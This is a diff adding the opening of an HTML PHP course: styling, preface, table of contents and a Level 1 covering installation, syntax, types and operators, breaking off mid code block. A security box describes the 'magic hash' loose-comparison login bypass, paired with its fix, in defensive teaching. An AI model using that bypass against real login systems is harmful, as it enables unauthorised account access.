@@ -1,0 +1,4673 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PHP: — Complete Course</title>
+<style>
+  @page { size: A4; margin: 18mm 16mm; }
+  @media print {
+    .page-break { page-break-before: always; }
+    .avoid-break { page-break-inside: avoid; }
+    body { font-size: 10.5pt; }
+    pre { page-break-inside: avoid; }
+    table { page-break-inside: avoid; }
+    h1, h2, h3 { page-break-after: avoid; }
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: 'Georgia', 'Cambria', 'Times New Roman', serif;
+    line-height: 1.7;
+    max-width: 950px;
+    margin: 0 auto;
+    padding: 30px 40px;
+    color: #1a1a1a;
+    background: #fff;
+  }
+  h1 {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 2.2em;
+    color: #4a148c;
+    border-bottom: 4px solid #4a148c;
+    padding-bottom: 12px;
+    margin-top: 46px;
+    margin-bottom: 20px;
+    letter-spacing: -0.5px;
+  }
+  h2 {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 1.55em;
+    color: #6a1b9a;
+    border-left: 6px solid #9c27b0;
+    padding-left: 14px;
+    margin-top: 36px;
+    margin-bottom: 12px;
+  }
+  h3 {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 1.2em;
+    color: #7b1fa2;
+    margin-top: 26px;
+    margin-bottom: 10px;
+  }
+  h4 {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 1.05em;
+    color: #333;
+    margin-top: 20px;
+    margin-bottom: 8px;
+  }
+  p { margin: 10px 0; text-align: justify; }
+  ul, ol { padding-left: 28px; margin: 10px 0; }
+  li { margin: 6px 0; }
+
+  code {
+    background: #f4f0fa;
+    color: #6a1b9a;
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+    font-size: 0.9em;
+    border: 1px solid #e4d8f0;
+  }
+  pre {
+    background: #1e1e2e;
+    color: #f8f8f2;
+    padding: 18px 22px;
+    border-radius: 8px;
+    overflow-x: auto;
+    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+    font-size: 0.85em;
+    line-height: 1.55;
+    border-left: 4px solid #9c27b0;
+    margin: 14px 0;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+  pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+    border: none;
+    font-size: 1em;
+  }
+
+  .theory {
+    background: #f8f5ff;
+    border-left: 4px solid #7b1fa2;
+    padding: 16px 22px;
+    margin: 16px 0;
+    border-radius: 0 8px 8px 0;
+  }
+  .theory::before {
+    content: "📖  THEORY";
+    display: block;
+    font-weight: 700;
+    color: #4a148c;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 0.78em;
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+  }
+  .theory p:first-child { margin-top: 0; }
+  .theory p:last-child { margin-bottom: 0; }
+
+  .analogy {
+    background: #fff8e1;
+    border-left: 4px solid #f9a825;
+    padding: 14px 20px;
+    margin: 14px 0;
+    border-radius: 0 8px 8px 0;
+    font-style: italic;
+    color: #4a3800;
+  }
+  .analogy::before {
+    content: "💡  ANALOGY";
+    display: block;
+    font-weight: 700;
+    font-style: normal;
+    color: #e65100;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 0.78em;
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+  }
+  .analogy p:first-child { margin-top: 0; }
+  .analogy p:last-child { margin-bottom: 0; }
+
+  .security {
+    background: #fff3f3;
+    border-left: 4px solid #d32f2f;
+    padding: 16px 22px;
+    margin: 16px 0;
+    border-radius: 0 8px 8px 0;
+  }
+  .security::before {
+    content: "💀  SECURITY NOTE";
+    display: block;
+    font-weight: 700;
+    color: #b71c1c;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 0.78em;
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+  }
+  .security p:first-child { margin-top: 0; }
+  .security p:last-child { margin-bottom: 0; }
+
+  .practice {
+    background: #f1f8e9;
+    border-left: 4px solid #689f38;
+    padding: 16px 22px;
+    margin: 16px 0;
+    border-radius: 0 8px 8px 0;
+  }
+  .practice::before {
+    content: "✍️  PRACTICE EXERCISES";
+    display: block;
+    font-weight: 700;
+    color: #33691e;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 0.78em;
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+  }
+  .practice ol { margin: 0; }
+  .practice p:first-child { margin-top: 0; }
+  .practice p:last-child { margin-bottom: 0; }
+
+  .note {
+    background: #e3f2fd;
+    border-left: 4px solid #1976d2;
+    padding: 14px 20px;
+    margin: 14px 0;
+    border-radius: 0 8px 8px 0;
+  }
+  .note::before {
+    content: "📌  NOTE";
+    display: block;
+    font-weight: 700;
+    color: #0d47a1;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 0.78em;
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+  }
+  .note p:first-child { margin-top: 0; }
+  .note p:last-child { margin-bottom: 0; }
+
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    margin: 16px 0;
+    font-size: 0.92em;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+  }
+  th, td {
+    border: 1px solid #d0c0e0;
+    padding: 9px 13px;
+    text-align: left;
+    vertical-align: top;
+  }
+  th {
+    background: #f0e6ff;
+    color: #4a148c;
+    font-weight: 700;
+  }
+  tr:nth-child(even) td { background: #faf7ff; }
+
+  .diagram {
+    background: #f9f9fb;
+    border: 2px dashed #b39ddb;
+    padding: 20px 22px;
+    margin: 18px 0;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 0.8em;
+    white-space: pre;
+    overflow-x: auto;
+    border-radius: 8px;
+    line-height: 1.4;
+    color: #2a1a4a;
+  }
+
+  .cover {
+    text-align: center;
+    padding: 110px 20px 80px;
+    border-bottom: 6px double #4a148c;
+    margin-bottom: 30px;
+  }
+  .cover h1 {
+    font-size: 4.2em;
+    border: none;
+    margin: 0;
+    padding: 0;
+    color: #4a148c;
+    letter-spacing: 4px;
+    font-weight: 900;
+  }
+  .cover .subtitle {
+    font-size: 1.4em;
+    color: #7b1fa2;
+    margin: 24px 0 10px;
+    letter-spacing: 6px;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    font-weight: 300;
+  }
+  .cover .tagline {
+    font-size: 1em;
+    color: #666;
+    max-width: 620px;
+    margin: 30px auto;
+    font-style: italic;
+    line-height: 1.8;
+  }
+  .cover .meta {
+    font-size: 1em;
+    color: #555;
+    margin-top: 80px;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    line-height: 2;
+  }
+  .cover .meta strong { color: #4a148c; }
+
+  .toc {
+    background: #f8f5ff;
+    border: 2px solid #9c27b0;
+    border-radius: 10px;
+    padding: 26px 32px;
+    margin: 30px 0;
+  }
+  .toc h2 { margin-top: 0; border: none; padding: 0; }
+  .toc ol { padding-left: 26px; }
+  .toc li { margin: 8px 0; font-family: 'Segoe UI', Arial, sans-serif; }
+  .toc .sub { color: #6a1b9a; font-size: 0.9em; margin-left: 6px; }
+
+  blockquote {
+    border-left: 4px solid #ddd;
+    padding-left: 16px;
+    color: #555;
+    font-style: italic;
+    margin: 14px 0;
+  }
+
+  .badge {
+    display: inline-block;
+    background: #4a148c;
+    color: white;
+    padding: 4px 12px;
+    border-radius: 4px;
+    font-size: 0.65em;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    letter-spacing: 1.5px;
+    vertical-align: middle;
+    font-weight: 700;
+  }
+  .badge.int { background: #6a1b9a; }
+  .badge.adv { background: #b71c1c; }
+  .badge.exp { background: #111; }
+
+  .kbd {
+    display: inline-block;
+    padding: 2px 8px;
+    background: #f4f4f4;
+    border: 1px solid #ccc;
+    border-bottom-width: 2px;
+    border-radius: 4px;
+    font-family: 'Consolas', monospace;
+    font-size: 0.85em;
+    color: #333;
+  }
+</style>
+</head>
+<body>
+
+<!-- ==================================================== -->
+<!--                   COVER PAGE                        -->
+<!-- ==================================================== -->
+<div class="cover">
+  <h1>PHP</h1>
+  <div class="subtitle">BEGINNER GUIDE</div>
+  <p class="tagline">
+    A complete, deeply-explained course in 8 levels.<br>
+    From your first <code>echo</code> to understanding SQL injection,<br>
+    PHP object injection, and real-world exploit chains.
+  </p>
+  <div class="meta">
+    <p><strong>Author:</strong> @S3ntinel__</p>
+    <p><strong>Channel:</strong> @SGCodexs</p>
+    <p style="margin-top:30px; font-size:0.85em; color:#888;">💀 Feel The Presence</p>
+  </div>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================================================== -->
+<!--                    PREFACE                          -->
+<!-- ==================================================== -->
+<h1>Preface — How to Use This Book</h1>
+
+<div class="theory">
+This book teaches PHP from absolute zero to advanced security work. Every concept is explained with three things: <strong>theory</strong> (what it is and why it exists), <strong>analogy</strong> (a mental model to remember it by), and <strong>working code</strong>. Where a topic has security implications, there's a red-boxed <strong>Security Note</strong>. Every level ends with <strong>practice exercises</strong>.
+</div>
+
+<h3>The 8 Levels</h3>
+
+<table>
+<tr><th>Level</th><th>Topic</th><th>You'll Be Able To</th></tr>
+<tr><td>1</td><td>Foundations</td><td>Write basic scripts, understand PHP's execution model</td></tr>
+<tr><td>2</td><td>Control Flow &amp; Functions</td><td>Write logic, reuse code, use closures</td></tr>
+<tr><td>3</td><td>Arrays, Strings, Regex</td><td>Manipulate any data structure, parse text</td></tr>
+<tr><td>4</td><td>Object-Oriented PHP</td><td>Design classes, use traits, interfaces, enums</td></tr>
+<tr><td>5</td><td>Files, Sessions, Errors</td><td>Handle uploads, sessions, exceptions</td></tr>
+<tr><td>6</td><td>Database (PDO)</td><td>Query safely, use prepared statements, transactions</td></tr>
+<tr><td>7</td><td>Advanced PHP</td><td>Composer, generators, fibers, attributes</td></tr>
+<tr><td>8</td><td>Security &amp; Exploitation</td><td>Recognize and prevent all major PHP vulnerabilities</td></tr>
+</table>
+
+<h3>How to Read</h3>
+
+<ol>
+  <li><strong>Read theory first.</strong> Don't skip. If you don't know <em>why</em>, you'll forget <em>how</em>.</li>
+  <li><strong>Type every code sample.</strong> Copy-paste skips muscle memory. Type it out — you'll make mistakes, and fixing them teaches you.</li>
+  <li><strong>Do every practice exercise</strong> before moving to the next level. No exceptions.</li>
+  <li><strong>Use a real environment.</strong> Install PHP locally (Level 1 covers this). Real terminal beats an online sandbox for learning.</li>
+</ol>
+
+<h3>Why "Hacker Level"?</h3>
+
+<div class="theory">
+<strong>Understanding how code breaks is how you learn to write code that doesn't.</strong> Professional penetration testers, bug bounty hunters, and secure developers all learn the same material: how SQL injection works, how serialization attacks work, how file inclusion leads to remote code execution. This book teaches you those mechanisms from the <em>defensive</em> angle — with full code — so you can spot them in the wild and fix them in your own projects.
+</div>
+
+<div class="security">
+Every "attack" technique in this book is presented with its <strong>mitigation</strong> in the same section. This is the same content taught in the OWASP Top 10, PortSwigger Web Security Academy, and OSCP certification — all legitimate, all legal, all used by every serious security professional.
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================================================== -->
+<!--                     TOC                             -->
+<!-- ==================================================== -->
+<div class="toc">
+  <h2>📑 Table of Contents</h2>
+  <ol>
+    <li><strong>Level 1 — Foundations</strong>
+      <div class="sub">1.1 What PHP Is · 1.2 Installation · 1.3 Hello World · 1.4 Variables &amp; Constants · 1.5 Data Types · 1.6 Operators · 1.7 Superglobals · 1.8 Practice</div>
+    </li>
+    <li><strong>Level 2 — Control Flow &amp; Functions</strong>
+      <div class="sub">2.1 Conditionals · 2.2 Loops · 2.3 Functions · 2.4 Closures &amp; Arrow Functions · 2.5 References · 2.6 Practice</div>
+    </li>
+    <li><strong>Level 3 — Arrays, Strings, Regex</strong>
+      <div class="sub">3.1 Arrays Deep Dive · 3.2 Array Functions · 3.3 String Functions · 3.4 Heredoc &amp; Nowdoc · 3.5 Regex · 3.6 Practice</div>
+    </li>
+    <li><strong>Level 4 — Object-Oriented PHP</strong>
+      <div class="sub">4.1 Why OOP · 4.2 Classes · 4.3 Visibility · 4.4 Promotion · 4.5 Inheritance · 4.6 Static · 4.7 Magic Methods · 4.8 Enums · 4.9 Readonly · 4.10 Practice</div>
+    </li>
+    <li><strong>Level 5 — Files, Sessions, Errors</strong>
+      <div class="sub">5.1 File I/O · 5.2 Sessions · 5.3 Cookies · 5.4 Uploads · 5.5 Error Handling · 5.6 Practice</div>
+    </li>
+    <li><strong>Level 6 — Database with PDO</strong>
+      <div class="sub">6.1 MySQL Basics · 6.2 PDO Connection · 6.3 Prepared Statements · 6.4 Transactions · 6.5 Migrations · 6.6 Practice</div>
+    </li>
+    <li><strong>Level 7 — Advanced PHP</strong>
+      <div class="sub">7.1 Namespaces · 7.2 Composer · 7.3 Generators · 7.4 Fibers · 7.5 Attributes · 7.6 Advanced Types · 7.7 Practice</div>
+    </li>
+    <li><strong>Level 8 — Security &amp; Exploitation</strong>
+      <div class="sub">8.1 SQLi · 8.2 XSS · 8.3 CSRF · 8.4 File Upload · 8.5 LFI/RFI · 8.6 POI · 8.7 SSRF · 8.8 Command Injection · 8.9 Type Juggling · 8.10 Session Attacks · 8.11 Final Capstone</div>
+    </li>
+  </ol>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 1                         -->
+<!-- ==================================================== -->
+<h1>Level 1 — Foundations <span class="badge">BEGINNER</span></h1>
+
+<h2>1.1 What PHP Is</h2>
+
+<div class="theory">
+<strong>PHP</strong> stands for <em>PHP: Hypertext Preprocessor</em> (a recursive acronym — the first word is itself). It is a <strong>server-side scripting language</strong>. That means the code lives on the server, executes there, and only the <em>result</em> — usually HTML — is sent to the browser. The user never sees your PHP source code, only its output. This is the fundamental difference between PHP and JavaScript: JS runs in the browser, PHP runs on the server.
+</div>
+
+<div class="analogy">
+<p>Think of a restaurant. The <strong>browser</strong> is the customer. The <strong>server</strong> is the kitchen. The <strong>PHP file</strong> is the recipe. When a customer orders a dish (HTTP request), the kitchen (PHP) prepares it using the recipe, and hands out the finished plate (HTML output). The customer never sees the recipe — only the plated dish. That's why you can't just "view source" a PHP site and see the backend code.</p>
+</div>
+
+<h3>Historical Context (Why PHP Exists)</h3>
+
+<div class="theory">
+Rasmus Lerdorf created PHP in <strong>1994</strong> as a set of Perl scripts to track who visited his resume. He called them "Personal Home Page Tools." He rewrote them in C, added form handling, and released PHP/FI (Forms Interpreter) in 1995. By 1997, two Israeli developers (Zeev Suraski and Andi Gutmans) rewrote the parser, giving us PHP 3 and eventually the "Zend Engine" — the same engine powering PHP today. Despite critics predicting its death every year, PHP still runs <strong>~75% of websites</strong> with a known server language, including WordPress, Wikipedia, Slack, Etsy, and — via a custom virtual machine called HHVM — Facebook.
+</div>
+
+<h3>Request Lifecycle</h3>
+
+<div class="theory">
+Understanding what happens on every request is <em>critical</em>. Here's the full journey from click to rendered page.
+</div>
+
+<div class="diagram">
+   YOUR BROWSER                  WEB SERVER                  PHP ENGINE
+   ────────────                  ──────────                  ──────────
+
+1.  Type URL:
+    example.com/page.php
+         │
+         ▼
+2.  HTTP GET /page.php ──────►  3.  Apache/Nginx
+                                     receives request
+                                         │
+                                         │ checks:
+                                         │ - file exists?
+                                         │ - .php extension?
+                                         ▼
+                                 4.  Hands to PHP-FPM
+                                     (FastCGI process manager)
+                                         │
+                                         ▼
+                                 5.  PHP interpreter
+                                     - Reads page.php
+                                     - Parses syntax
+                                     - Executes line by line
+                                         │
+                                         ├──►  Talks to MySQL
+                                         │     (if needed)
+                                         │
+                                         ├──►  Reads/writes files
+                                         │
+                                         ├──►  Reads session data
+                                         │
+                                         ▼
+                                 6.  Produces HTML string
+                                         │
+7.  Rendered HTML ◄──────────   Apache sends HTML back
+</div>
+
+<h3>Where PHP Fits Today</h3>
+
+<table>
+<tr><th>Category</th><th>Examples</th></tr>
+<tr><td>CMS</td><td>WordPress, Drupal, Joomla</td></tr>
+<tr><td>E-commerce</td><td>Magento, WooCommerce, PrestaShop</td></tr>
+<tr><td>Frameworks</td><td>Laravel, Symfony, CodeIgniter, CakePHP, Yii</td></tr>
+<tr><td>Wiki / Knowledge</td><td>MediaWiki (Wikipedia)</td></tr>
+<tr><td>Chat / Collab</td><td>Slack backend, Mattermost</td></tr>
+<tr><td>Legacy Enterprise</td><td>Facebook (pre-Hack), Yahoo, Mailchimp</td></tr>
+</table>
+
+<h2>1.2 Installation</h2>
+
+<div class="theory">
+To run PHP locally, you need three things: <strong>PHP</strong> itself, a <strong>web server</strong> (Apache or Nginx), and ideally a <strong>database</strong> (MySQL or MariaDB). Getting these separately is a pain. That's why beginners use <strong>XAMPP</strong> — a single installer that bundles Apache, MySQL/MariaDB, PHP, and phpMyAdmin (a browser GUI for MySQL).
+</div>
+
+<h3>Recommended Setup by OS</h3>
+
+<table>
+<tr><th>OS</th><th>Recommended</th><th>Notes</th></tr>
+<tr><td>Windows</td><td>XAMPP</td><td>Download from apachefriends.org — installs to <code>C:\xampp\</code></td></tr>
+<tr><td>macOS</td><td>Homebrew</td><td><code>brew install php</code> — Homebrew installs PHP, then add MySQL separately</td></tr>
+<tr><td>Ubuntu/Debian</td><td>apt</td><td><code>sudo apt install php php-mysql mysql-server</code></td></tr>
+<tr><td>Any (advanced)</td><td>Docker</td><td><code>docker run -p 8000:80 php:8.3-apache</code></td></tr>
+</table>
+
+<h3>Verifying Installation</h3>
+
+<p>After installing, open a terminal (Command Prompt / PowerShell on Windows, Terminal on Mac/Linux) and run:</p>
+
+<pre><code>php -v</code></pre>
+
+<p>You should see something like:</p>
+
+<pre><code>PHP 8.3.6 (cli) (built: Apr 10 2024 14:21:47) (NTS)
+Copyright (c) The PHP Group
+Zend Engine v4.3.6, Copyright (c) Zend Technologies</code></pre>
+
+<div class="note">
+If the command isn't found, PHP isn't in your system PATH. On Windows with XAMPP, PHP is usually at <code>C:\xampp\php\php.exe</code>. You can either add it to PATH or use the full path.
+</div>
+
+<h3>The Built-In Dev Server</h3>
+
+<div class="theory">
+Since PHP 5.4, PHP ships with a mini web server perfect for local development. It's <strong>not</strong> for production — it's single-threaded and has no security hardening — but for learning it's perfect and instant.
+</div>
+
+<pre><code>cd C:\Users\luvky\mpm
+php -S localhost:8000</code></pre>
+
+<p>Then visit <code>http://localhost:8000</code> in your browser. Files in the current directory are now served. Any <code>.php</code> file will execute; any other file is served as-is.</p>
+
+<div class="note">
+The built-in server does <strong>not</strong> show errors by default in older versions. Create an <code>index.php</code> with this at the top while developing:
+<pre style="margin-top:8px;"><code>&lt;?php
+error_reporting(E_ALL);
+ini_set('display_errors', '1');</code></pre>
+</div>
+
+<h2>1.3 Hello, World</h2>
+
+<div class="theory">
+Every PHP file begins with the opening tag <code>&lt;?php</code>. The closing tag <code>?&gt;</code> is optional — and in pure-PHP files, best practice is to <strong>omit it</strong>, because trailing whitespace after <code>?&gt;</code> can be sent to the browser, breaking headers. For files that mix PHP with HTML, you'll close and reopen tags freely.
+</div>
+
+<h3>Your First Script — <code>hello.php</code></h3>
+
+<pre><code>&lt;?php
+// This is a single-line comment
+# This is also a single-line comment (shell-style)
+/* This is a
+   multi-line
+   comment */
+
+// Output functions
+echo "Hello, World\n";           // no return value
+print "Also works\n";            // returns 1
+printf("Formatted: %s is %d\n", "Devils", 22);
+
+// Debugging
+var_dump([1, 2, 3]);             // type + value
+print_r([1, 2, 3]);              // human-readable
+?&gt;</code></pre>
+
+<div class="theory">
+<strong><code>echo</code></strong> and <strong><code>print</code></strong> are not functions — they are language constructs. They're faster than function calls and don't need parentheses. <strong><code>var_dump()</code></strong> and <strong><code>print_r()</code></strong> are functions and do need them. In production code, you should never leave <code>var_dump()</code> or <code>print_r()</code> in a script — they leak internal structure to attackers.
+</div>
+
+<h3>Mixing PHP with HTML</h3>
+
+<div class="theory">
+One of PHP's original design goals was embedding code in HTML. You can switch between HTML and PHP freely, and even use the alternative syntax (<code>if:</code> ... <code>endif;</code>) for cleaner template code.
+</div>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome&lt;/h1&gt;
+    &lt;?php
+        $name = "Devils";
+        echo "&lt;p&gt;Hello, $name&lt;/p&gt;";
+    ?&gt;
+    &lt;?php if ($name === "Devils"): ?&gt;
+        &lt;p&gt;Admin detected&lt;/p&gt;
+    &lt;?php endif; ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<div class="note">
+Files that contain only PHP (no HTML) should not include the closing <code>?&gt;</code>. This prevents accidental whitespace output. Files that mix HTML and PHP must use the closing tag where needed.
+</div>
+
+<h2>1.4 Variables &amp; Constants</h2>
+
+<div class="theory">
+Variables in PHP always begin with a dollar sign <code>$</code>. They are <strong>dynamically typed</strong> — the interpreter infers the type from the value. You can assign an integer, then a string, then an array to the same variable without error. PHP 7+ added optional strict typing at the function level, and PHP 8 made the type system stricter overall.
+</div>
+
+<div class="analogy">
+<p>A PHP variable is like a labeled box. You write <code>$name = "Devils";</code> — you've labeled a box "name" and put the string "Devils" inside. Later, <code>$name = 42;</code> — you empty the box and put a number in. The box (the variable) is the same; its contents (the value) can change shape freely.</p>
+</div>
+
+<h3>Naming Rules</h3>
+
+<ul>
+  <li>Must start with <code>$</code> followed by a letter or underscore</li>
+  <li>Can contain letters, numbers, underscores</li>
+  <li><strong>Case-sensitive</strong>: <code>$name</code> and <code>$Name</code> are different variables</li>
+  <li>Cannot start with a digit</li>
+</ul>
+
+<pre><code>&lt;?php
+$name       = "Devils";
+$age        = 22;
+$pi         = 3.14159;
+$isAdmin    = true;
+$nothing    = null;
+
+$_private   = "okay";        // leading underscore is fine
+$user_name  = "snake_case";  // conventions matter
+$userName   = "camelCase";   // most common in modern PHP
+
+// Dynamic typing in action
+$x = 5;          // int
+$x = "hello";    // now string
+$x = [1, 2];     // now array — no error
+?&gt;</code></pre>
+
+<h3>Constants</h3>
+
+<div class="theory">
+A <strong>constant</strong> is a named value that cannot be changed or undefined once set. Constants do <em>not</em> use a <code>$</code> prefix. There are two ways to define them:
+</div>
+
+<ul>
+  <li><code>define("NAME", value)</code> — runtime, works inside functions, allows expressions</li>
+  <li><code>const NAME = value;</code> — compile-time, works at top level and inside classes</li>
+</ul>
+
+<pre><code>&lt;?php
+define("MAX_USERS", 100);
+define("APP_NAME", "Exam Portal");
+
+const DB_HOST = "localhost";
+const DB_PORT = 3306;
+
+echo MAX_USERS;      // 100
+echo DB_HOST;        // localhost
+
+// Constants can hold arrays (PHP 7+)
+define("ROLES", ["admin", "teacher", "student"]);
+echo ROLES[0];       // admin
+
+// Case-sensitivity (always case-sensitive since PHP 8.0)
+// define("X", 1); echo x; → warning, x undefined
+?&gt;</code></pre>
+
+<div class="note">
+Pre-PHP 8, <code>define("X", 1, true)</code> created a case-insensitive constant. This behavior was <strong>removed in PHP 8.0</strong> — a great example of PHP cleaning up legacy features.
+</div>
+
+<h3>Magic Constants</h3>
+
+<div class="theory">
+PHP provides a set of "magic constants" that start and end with double underscores. They change depending on where they're used and are resolved at compile time.
+</div>
+
+<table>
+<tr><th>Constant</th><th>Value</th></tr>
+<tr><td><code>__FILE__</code></td><td>Full path of the current file</td></tr>
+<tr><td><code>__DIR__</code></td><td>Directory of the current file</td></tr>
+<tr><td><code>__LINE__</code></td><td>Current line number</td></tr>
+<tr><td><code>__FUNCTION__</code></td><td>Current function name</td></tr>
+<tr><td><code>__CLASS__</code></td><td>Current class name</td></tr>
+<tr><td><code>__METHOD__</code></td><td>Current method name (with class)</td></tr>
+<tr><td><code>__NAMESPACE__</code></td><td>Current namespace</td></tr>
+<tr><td><code>__TRAIT__</code></td><td>Current trait name</td></tr>
+</table>
+
+<h2>1.5 Data Types</h2>
+
+<div class="theory">
+PHP 8 has <strong>ten</strong> types split into three groups:
+</div>
+
+<ul>
+  <li><strong>Scalar:</strong> <code>int</code>, <code>float</code>, <code>string</code>, <code>bool</code></li>
+  <li><strong>Compound:</strong> <code>array</code>, <code>object</code>, <code>callable</code>, <code>iterable</code></li>
+  <li><strong>Special:</strong> <code>null</code>, <code>resource</code></li>
+</ul>
+
+<h3>Integers</h3>
+
+<pre><code>&lt;?php
+$a = 42;            // decimal
+$b = -17;           // negative
+$c = 0xFF;          // hex (255)
+$d = 0b1010;        // binary (10)
+$e = 0755;          // octal (493)
+$f = 1_000_000;     // underscore separator (PHP 7.4+)
+
+echo PHP_INT_MAX;    // 9223372036854775807 on 64-bit
+echo PHP_INT_SIZE;   // 8 (bytes on 64-bit)
+?&gt;</code></pre>
+
+<h3>Floats</h3>
+
+<pre><code>&lt;?php
+$pi    = 3.14159;
+$big   = 1.2e3;      // 1200.0
+$small = 1.5e-3;     // 0.0015
+
+var_dump(NAN);       // float(NAN)
+var_dump(INF);       // float(INF)
+
+// Never compare floats with ==
+var_dump(0.1 + 0.2 === 0.3);   // false
+var_dump(abs((0.1 + 0.2) - 0.3) &lt; 1e-10);  // true (correct way)
+?&gt;</code></pre>
+
+<h3>Strings</h3>
+
+<div class="theory">
+PHP has two string syntaxes: <strong>single-quoted</strong> (literal — only <code>\'</code> and <code>\\</code> are escaped) and <strong>double-quoted</strong> (interpolates variables and escapes <code>\n</code>, <code>\t</code>, <code>\r</code>, <code>\$</code>, etc.).
+</div>
+
+<pre><code>&lt;?php
+$name = "Devils";
+
+$single = 'Hello, $name';         // literal: Hello, $name
+$double = "Hello, $name";         // interpolated: Hello, Devils
+
+// Escape sequences in double quotes
+echo "Line 1\nLine 2\tTabbed\r";
+echo "Dollar sign: \$name\n";     // prints "$name"
+
+// Heredoc, Nowdoc (advanced — see Level 3)
+?&gt;</code></pre>
+
+<h3>Booleans</h3>
+
+<div class="theory">
+Any value in PHP can be coerced to boolean. The following are <strong>falsy</strong>: <code>false</code>, <code>0</code>, <code>0.0</code>, <code>""</code>, <code>"0"</code>, <code>[]</code>, <code>null</code>. Everything else is truthy — including the string <code>"0.0"</code> and the array <code>[0]</code>.
+</div>
+
+<div class="security">
+The fact that <strong><code>"0"</code> is falsy but <code>"0.0"</code> is truthy</strong> has caused real authentication bugs. Code like <code>if ($_POST['password']) { ... }</code> treats the literal string <code>"0"</code> as "not provided." Always use explicit comparisons (<code>!== null</code>, <code>!== ''</code>) instead of relying on truthiness for security-critical checks.
+</div>
+
+<h3>Arrays (Preview — full detail in Level 3)</h3>
+
+<pre><code>&lt;?php
+$list = [1, 2, 3];                        // indexed
+$map  = ["name" =&gt; "Devils", "age" =&gt; 22]; // associative
+$nest = [[1, 2], [3, 4]];                 // multidimensional
+?&gt;</code></pre>
+
+<h3>Null &amp; Undefined</h3>
+
+<pre><code>&lt;?php
+$nothing = null;
+var_dump($nothing);        // NULL
+var_dump(isset($nothing)); // false — isset returns false for null
+var_dump(empty($nothing)); // true
+
+// Undefined variable
+var_dump($undefined);      // Warning + NULL (PHP 8)
+?&gt;</code></pre>
+
+<h3>Type Juggling &amp; Comparison</h3>
+
+<div class="theory">
+When you compare two values with <code>==</code> (loose), PHP converts them to a common type. With <code>===</code> (strict), both value and type must match.
+</div>
+
+<pre><code>&lt;?php
+// Loose (==) — dangerous
+var_dump(0 == "a");         // false in PHP 8 (was true in 7)
+var_dump("1" == "01");      // true
+var_dump("10" == "1e1");    // true
+var_dump(100 == "1e2");     // true
+var_dump("abc" == 0);       // false (PHP 8) — was true in 7
+
+// Strict (===) — safe
+var_dump("1" === "01");     // false
+var_dump(100 === "1e2");    // false
+?&gt;</code></pre>
+
+<div class="security">
+<strong>The Magic Hash Attack.</strong> In PHP 7 and earlier, if a string started with <code>0e</code> followed by digits, PHP's loose comparison treated it as the number <code>0 × 10^n = 0</code>. So <code>"0e123456" == "0e789012"</code> was <strong>true</strong>. If a login system used <code>==</code> to compare password hashes (e.g. MD5), an attacker could send a password whose hash begins with <code>0e</code> and bypass authentication entirely.
+<br><br>
+<strong>Fix:</strong> use <code>===</code> for equality, and <code>hash_equals($known, $user)</code> for comparing hashes. Never use <code>==</code> in security-sensitive code.
+</div>
+
+<h2>1.6 Operators</h2>
+
+<div class="theory">
+PHP's operators are similar to C, Java, and JavaScript, with a few extras: <code>.</code> for string concatenation, <code>&lt;=&gt;</code> (spaceship) for three-way comparison, <code>??</code> for null-coalescing, and <code>?-&gt;</code> (nullsafe, PHP 8) for chained calls that short-circuit on null.
+</div>
+
+<h3>Arithmetic</h3>
+
+<pre><code>&lt;?php
+5 + 3       // 8
+5 - 3       // 2
+5 * 3       // 15
+5 / 3       // 1.6666...
+5 % 3       // 2
+2 ** 10     // 1024 (power, PHP 5.6+)
+?&gt;</code></pre>
+
+<h3>Assignment</h3>
+
+<pre><code>&lt;?php
+$x = 5;
+$x += 3;      // $x = 8
+$x -= 2;      // $x = 6
+$x *= 4;      // $x = 24
+$x /= 3;      // $x = 8.0
+$x %= 5;      // $x = 3.0
+$x **= 2;     // $x = 9.0
+$s = "Hi";
+$s .= " there";  // "Hi there"
+?&gt;</code></pre>
+
+<h3>Comparison</h3>
+
+<pre><code>&lt;?php
+==   // equal (loose — dangerous)
+!=   // not equal
+===  // identical (value AND type)
+!==  // not identical
+&lt;    // less than
+&lt;=   // less or equal
+&gt;    // greater
+&gt;=   // greater or equal
+&lt;=&gt;  // spaceship (PHP 7+): returns -1, 0, 1
+
+var_dump(5 &lt;=&gt; 3);   // 1
+var_dump(5 &lt;=&gt; 5);   // 0
+var_dump(3 &lt;=&gt; 5);   // -1
+?&gt;</code></pre>
+
+<h3>Logical</h3>
+
+<pre><code>&lt;?php
